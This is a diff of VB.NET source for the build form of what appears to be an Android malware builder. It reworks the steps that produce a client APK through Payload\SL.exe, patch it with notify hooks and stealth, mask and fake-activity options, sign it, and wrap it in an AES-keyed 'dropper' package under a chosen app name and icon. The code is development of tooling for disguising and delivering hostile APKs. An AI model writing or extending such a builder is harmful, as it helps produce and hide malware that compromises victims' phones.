+        Dim clientApkPath As String = ApkNotifyPatcher.EnsureClientOutputDirectory()
         Dim patchFailed As Boolean = False
+        Dim patchSucceeded As Boolean = False
         Dim patchReport As ApkNotifyPatcher.NotifyPatchReport = Nothing
+        Dim dropperReport As ApkDropperPatcher.DropperBuildReport = Nothing
 
         Dim needPatch As Boolean = notifyCfg.Enabled OrElse ApkProtectionPatcher.NeedsSmaliPatch(protectionCfg) OrElse (protectionCfg IsNot Nothing AndAlso protectionCfg.StealthEnabled)
 
-        If needPatch AndAlso File.Exists(distApkPath) Then
+        If Not File.Exists(distApkPath) Then
+            patchErrors.Add("Unsigned APK not found after SL.exe build: " & distApkPath)
+        ElseIf needPatch Then
             Dim patchErr As String = Nothing
-            If Not ApkNotifyPatcher.TryPatchApk(distApkPath, notifyCfg, protectionCfg, patchErr) Then
+            patchSucceeded = ApkNotifyPatcher.TryPatchApk(distApkPath, notifyCfg, protectionCfg, patchErr)
+            patchReport = ApkNotifyPatcher.GetLastNotifyPatchReport()
+            If Not patchSucceeded Then
                 patchFailed = True
-                patchErrors.Add(FormatBuildIssue("apk patch: " & patchErr))
+                If Not String.IsNullOrWhiteSpace(patchErr) Then
+                    patchErrors.Add(FormatBuildIssue("apk patch: " & patchErr))
+                End If
                 Dim bakPath As String = distApkPath & ".notify.bak"
                 If File.Exists(bakPath) Then
                     Try
@@ -807,22 +477,28 @@ Public Class Build
                     End Try
                 End If
             End If
-            patchReport = ApkNotifyPatcher.GetLastNotifyPatchReport()
-        ElseIf Not File.Exists(distApkPath) Then
-            patchErrors.Add("Unsigned APK not found after SL.exe build")
+        Else
+            patchSucceeded = True
         End If
 
-        If notifyCfg.Enabled AndAlso patchReport IsNot Nothing Then
-            If Not patchReport.ProviderInManifest AndAlso Not patchReport.LauncherHookApplied AndAlso Not patchReport.ApplicationHookApplied Then
-                patchErrors.Add("APK notify: no entry point found (provider/launcher/application)")
-            ElseIf Not patchReport.LauncherHookApplied AndAlso Not patchReport.ApplicationHookApplied Then
-                patchErrors.Add("APK notify: launcher hook missing — relies on provider only")
-            End If
+        If notifyCfg.Enabled AndAlso patchSucceeded AndAlso patchReport IsNot Nothing AndAlso Not ApkNotifyPatcher.HasNotifyEntryPoint(patchReport) Then
+            patchErrors.Add("APK notify: no entry point found (provider/launcher/application)")
+        ElseIf notifyCfg.Enabled AndAlso patchSucceeded AndAlso patchReport IsNot Nothing AndAlso Not patchReport.LauncherHookApplied AndAlso Not patchReport.ApplicationHookApplied AndAlso patchReport.ProviderInManifest Then
+            ' Provider-only bootstrap is valid; no extra warning.
         End If
 
         Dim signErr As String = Nothing
-        If Not ApkNotifyPatcher.TrySignDistToClient(signErr) Then
+        If File.Exists(distApkPath) AndAlso Not ApkNotifyPatcher.TrySignDistToClient(signErr, resourcesPath) Then
             patchErrors.Add(FormatBuildIssue("sign: " & signErr))
+        End If
+
+        If IsDropperEnabled() AndAlso ApkNotifyPatcher.IsValidApkFile(clientApkPath) Then
+            BuildDropperApk(packageName, aesKey, appName, iconPath, dropperReport)
+        ElseIf IsDropperEnabled() Then
+            dropperReport = New ApkDropperPatcher.DropperBuildReport With {
+                .Success = False,
+                .Errors = New List(Of String) From {"Client APK not found or invalid — build client first"}
+            }
         End If
 
         Dim apkSizeKb As Long = 0
@@ -845,7 +521,12 @@ Public Class Build
             .MaskType = If(protectionCfg IsNot Nothing, protectionCfg.MaskType, String.Empty),
             .FakeActivity = ApkProtectionPatcher.ResolveFakeActivity(protectionCfg),
             .PackageName = If(protectionCfg IsNot Nothing, protectionCfg.PackageName, String.Empty),
-            .DropperEnabled = chkDropperMode IsNot Nothing AndAlso chkDropperMode.Checked,
+            .DropperEnabled = IsDropperEnabled(),
+            .DropperSuccess = dropperReport IsNot Nothing AndAlso dropperReport.Success,
+            .DropperOutputPath = If(dropperReport IsNot Nothing, dropperReport.OutputPath, String.Empty),
+            .DropperStyle = If(dropperReport IsNot Nothing, dropperReport.Style, String.Empty),
+            .DropperPackage = If(dropperReport IsNot Nothing, dropperReport.DropperPackage, String.Empty),
+            .PublishedClientPath = If(dropperReport IsNot Nothing, dropperReport.PublishedClientPath, String.Empty),
             .PatchFailed = patchFailed,
             .LauncherHookApplied = patchReport IsNot Nothing AndAlso patchReport.LauncherHookApplied,
             .ApplicationHookApplied = patchReport IsNot Nothing AndAlso patchReport.ApplicationHookApplied,
@@ -853,6 +534,11 @@ Public Class Build
             .ReceiverInManifest = patchReport IsNot Nothing AndAlso patchReport.ReceiverInManifest
         }
         summary.Errors = patchErrors
+        If dropperReport IsNot Nothing AndAlso dropperReport.Errors IsNot Nothing Then
+            For Each err As String In dropperReport.Errors
+                summary.Errors.Add("Dropper: " & err)
+            Next
+        End If
         BuildResultDialog.ShowResult(Me, summary)
     End Sub
 
@@ -920,22 +606,28 @@ Public Class Build
                     sw.Write(stringBuilder.ToString())
                 End Using
                 Dim slExe As String = String.Concat(Store.Resources(1), "\Imports\Payload\SL.exe")
+                Dim slOk As Boolean = True
                 If File.Exists(slExe) Then
-                    RunSlExeAndWait(slExe)
+                    slOk = RunSlExeAndWait(slExe)
+                Else
+                    slOk = False
+                    MessageBox.Show("SL.exe not found in Payload folder.", "Build", MessageBoxButtons.OK, MessageBoxIcon.Warning)
+                End If
+                If Not slOk Then
+                    Dim failSummary As New BuildResultSummary With {
+                        .Success = False,
+                        .ApkPath = ApkNotifyPatcher.GetBuildingClientApkPath(),
+                        .NotifyEnabled = notifyCfg.Enabled,
+                        .ProtectionEnabled = protectionCfg.Enabled,
+                        .DropperEnabled = IsDropperEnabled()
+                    }
+                    failSummary.Errors = New List(Of String) From {"SL.exe build failed — check Java, apktool and Payload\s.inf"}
+                    BuildResultDialog.ShowResult(Me, failSummary)
+                    Return
                 End If
             End If
 
-            ApplyApkNotifyPatch(notifyCfg, protectionCfg, Store.Resources(1))
-
-            ' ---- Если включён Dropper Mode ----
-            Dim grpDropper As GroupBox = GetDropperGroupBox()
-            Dim chkDropper As CheckBox = Nothing
-            If grpDropper IsNot Nothing Then
-                chkDropper = TryCast(grpDropper.Controls("chkDropperMode_Dropper"), CheckBox)
-            End If
-            If chkDropper IsNot Nothing AndAlso chkDropper.Checked Then
-                BuildDropper(packageName, aesKey, appName, iconPath)
-            End If
+            ApplyApkNotifyPatch(notifyCfg, protectionCfg, Store.Resources(1), packageName, aesKey, appName, iconPath)
 
             MyBase.Close()
         Catch ex As Exception
@@ -1068,6 +760,14 @@ Public Class Build
     End Sub
 
     Private Sub cbMaskType_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cbMaskType.SelectedIndexChanged
+
+    End Sub
+
+    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
+
+    End Sub
+
+    Private Sub cbDropperStyle_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cbDropperStyle.SelectedIndexChanged
 
     End Sub
 End Class
